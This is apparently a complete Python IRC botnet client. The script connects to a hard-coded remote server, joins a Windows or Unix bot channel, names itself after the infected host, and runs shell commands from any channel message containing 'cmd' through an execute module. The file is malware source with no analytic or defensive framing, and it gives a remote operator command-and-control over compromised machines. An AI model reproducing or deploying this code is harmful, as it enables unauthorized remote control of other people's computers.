import socket, os
import subprocess
import irc
import execute

#SETTINGS:
if  os.name=="nt":
	settings_channel = "#winbots"
else:
	settings_channel = "#unixbots"
	
settings_server = "jpdias.noip.me"
settings_port = 1723
settings_botnick = "bot-"+socket.gethostname()
settings_botpass = "password"
settings_owner = "root"
settings_commandprefix = "!"

ircSession = irc.connect(settings_server,settings_port,settings_botnick,settings_botpass,settings_channel,settings_owner);

while True:
	recvText = ircSession.recv(2048) #Text read from the server
	recvText = recvText.split("\r\n")[0] # immediately take away the "\r\n" from the end of the string
	print "<-- " + recvText #Print the text to terminal for debugging
	parseText = recvText.split(" ")

	try:
		if parseText[1] == "PRIVMSG":
			#Handle PRIVMSGs here
			privmsgText = recvText.split(" ", 3)
			messageSender = privmsgText[0].lstrip(":").split("!")[0]
			messageChannel = privmsgText[2]
			messageSent = privmsgText[3].lstrip(":")
			#print "messageSender:", messageSender, "messageChannel:", messageChannel, "messageSent:", messageSent
			if messageSent[0] == settings_commandprefix:
				ircSession.ParseUserCommands(ircSession, messageSender, messageChannel, messageSent)
			if messageSent.find ( 'cmd' ) != -1:
				execute.ExecCmd(messageSent.split(':')[1])
		if parseText[0] == "PING":
			#Respond to PINGs
			pingSender = parseText[1].split(":")[1]
			ircSession.send("PONG :" + pingSender + "\r\n")
			#print "--> PONG :" + pingSender

	except IndexError:
		#If we can't parse the text, just ignore it and hope that it wasn't important.
		continue